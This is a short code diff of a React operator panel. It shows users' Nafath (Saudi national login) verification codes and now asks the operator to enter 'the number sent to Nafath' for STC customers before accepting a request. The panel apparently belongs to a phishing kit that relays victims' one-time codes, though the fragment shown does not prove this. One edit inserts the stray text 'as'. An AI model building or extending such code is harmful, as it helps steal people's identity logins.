@@ -211,7 +211,10 @@ const Main = () => {
   };
 
   const handleAcceptService = async (id) => {
-    socket.emit("acceptService", id);
+    if(user.data.phoneNetwork === "STC"){
+          if (!price) return window.alert("اكتب الرقم المرسل إلي نفاذ");
+    }
+    socket.emit("acceptService", {id,price});
     setUser({
       data: { ...user.data, networkAccept: true, navazAceept: false },
       active: true,
@@ -926,7 +929,7 @@ const Main = () => {
               ""
             )}
 
-            {user.data.navazAceept ? (
+            {user.data.navazAccept ? (
               <div className="flex flex-col items-center bg-sky-800 text-white py-2 px-3 rounded-lg gap-y-1   my-2">
                 رمز التحقق بعد نفاذ
                 <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
@@ -934,7 +937,7 @@ const Main = () => {
                   <span>{user.data?.navazOtp}</span>
                 </div>
                 {user.data.navazOtpAccept ? (
-                  ""
+                  "as"
                 ) : (
                   <div className="w-full flex col-span-2 md:col-span-1 justify-between gap-x-3  p-2 text-xs">
                     <button
